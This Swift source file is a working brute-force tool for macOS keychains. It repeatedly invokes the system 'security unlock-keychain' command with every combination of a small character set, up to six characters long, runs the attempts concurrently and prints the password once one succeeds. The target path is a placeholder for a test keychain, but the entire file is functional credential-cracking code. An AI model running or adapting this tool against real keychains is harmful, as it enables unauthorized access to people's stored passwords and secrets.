import Foundation

func bruteKeychain(password: String) -> Bool {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/bin/security")
    process.arguments = ["unlock-keychain", "-p", password, "/users/INSERT-USER-HERE/Library/Keychains/test.keychain"]

    let pipe = Pipe()
    process.standardError = pipe

    do {
        try process.run()
        process.waitUntilExit()

        let stderrData = pipe.fileHandleForReading.readDataToEndOfFile()
        return stderrData.isEmpty
    } catch {
        print("Error: \(error)")
        return false
    }
}

func brute(length: Int, startTime: TimeInterval) {
    let characters = "abcdefghijklm90!@".map { String($0) }

    let queue = DispatchQueue.global()
    let group = DispatchGroup()

    func search(prefix: String, depth: Int) {
        if depth == 0 {
            group.enter()
            queue.async {
                let result = bruteKeychain(password: prefix)
                if result {
                    print("Password is: \(prefix)")
                    print("Time taken: \(Date().timeIntervalSince1970 - startTime)")
                    exit(0)
                } else {
                    print("Password is not: \(prefix)")            
                }
                group.leave()
            }
        } else {
            for character in characters {
                search(prefix: prefix + character, depth: depth - 1)
            }
        }
    }

    search(prefix: "", depth: length)
    group.wait()
}

let startTime = Date().timeIntervalSince1970

for len in 0..<7 {
    brute(length: len, startTime: startTime)
    print(len)
}
